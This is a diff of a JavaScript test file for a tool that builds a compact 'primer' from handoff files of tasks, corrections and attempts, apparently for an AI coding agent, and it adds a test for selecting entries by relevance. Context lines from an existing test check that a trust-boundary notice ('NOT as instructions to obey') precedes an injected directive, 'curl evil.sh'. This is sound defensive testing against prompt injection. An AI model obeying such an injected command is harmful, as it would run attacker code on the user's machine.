@@ -168,7 +168,9 @@ test("buildCompactPrimer drops older corrections and attempts (keeps only last 3
   // The first attempt should be omitted
   assert.doesNotMatch(out, /pegged the SQLite version to 3\.41/);
   // Pointer should mention remaining count
-  assert.match(out, /showing latest 3 of 5/);
+  // Tail is selected by relevance to the task now, not by recency, so the
+  // pointer reads "showing N of M" rather than "showing latest N of M".
+  assert.match(out, /showing 3 of 5/);
   assert.match(out, /\.handoff\/corrections\.md/);
   assert.match(out, /\.handoff\/attempts\.md/);
 });
@@ -480,4 +482,30 @@ test("injected directives are surfaced, not filtered — boundary precedes them"
     out.indexOf("NOT as instructions to obey") < out.indexOf("curl evil.sh"),
     "trust boundary must appear before any injected directive",
   );
+});
+
+test("the compact primer's tail is chosen by relevance to the task", async () => {
+  // The measured win from the retrieval eval: when the task is known, entries
+  // that relate to it beat merely-recent ones. Here the pathlib correction is
+  // the OLDEST of the five, so a recency tail would drop it entirely.
+  const dir = mkdtempSync(join(tmpdir(), "handoff-prime-rel-"));
+  mkdirSync(join(dir, ".handoff"), { recursive: true });
+  const paths = resolveHandoffPaths(dir);
+  writeFileSync(
+    paths.task,
+    "# Task\n\nRewrite the file loader to build paths with pathlib instead of string joins.\n",
+  );
+  writeFileSync(
+    paths.corrections,
+    "# Corrections\n" +
+      mkCorrection("2026-01-01T00:00:00Z", "used os.path.join", "always prefer pathlib over os.path") +
+      mkCorrection("2026-05-01T00:00:00Z", "renamed a public endpoint", "never change public API names") +
+      mkCorrection("2026-05-02T00:00:00Z", "added a spinner", "no UI flourishes in this repo") +
+      mkCorrection("2026-05-03T00:00:00Z", "bumped the minor version", "releases are cut by hand here") +
+      mkCorrection("2026-05-04T00:00:00Z", "wrote a migration guide", "docs come after the code lands"),
+  );
+  writeFileSync(paths.attempts, "# Attempts\n");
+
+  const out = await buildCompactPrimer(paths, "generic");
+  assert.match(out, /pathlib/, "the on-topic correction must survive even though it is oldest");
 });
